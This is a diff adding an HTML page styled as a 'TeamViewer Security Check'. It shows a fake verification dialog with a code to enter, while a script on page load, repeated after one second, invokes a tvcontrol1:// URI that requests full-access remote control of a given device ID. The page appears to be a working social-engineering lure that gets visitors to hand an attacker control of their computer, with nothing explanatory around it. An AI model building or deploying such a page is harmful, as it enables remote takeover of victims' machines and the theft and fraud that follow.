@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TeamViewer Security Check</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 20vh;
+            background: #f5f5f5;
+        }
+        .dialog {
+            background: white;
+            border: 1px solid #ccc;
+            padding: 30px;
+            max-width: 400px;
+            margin: 0 auto;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h2 { color: #00467f; }
+        .code {
+            font-size: 2em;
+            font-weight: bold;
+            margin: 20px 0;
+            background: #eef;
+            padding: 10px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="dialog">
+        <h2>Security Verification</h2>
+        <p>We are securing your connection.<br>Please wait...</p>
+        <p>When the TeamViewer app opens,<br>enter the following verification code:</p>
+        <div class="code" id="code">n79ktdgt</div>
+        <p><small>This code will expire in 5 minutes.</small></p>
+    </div>
+
+    <script>
+        window.location = "tvcontrol1://control?device=791826887&authorization=FullAccess";
+
+        setTimeout(function(){
+            if (document.hasFocus()) {
+                window.location = "tvcontrol1://control?device=791826887&authorization=FullAccess";
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
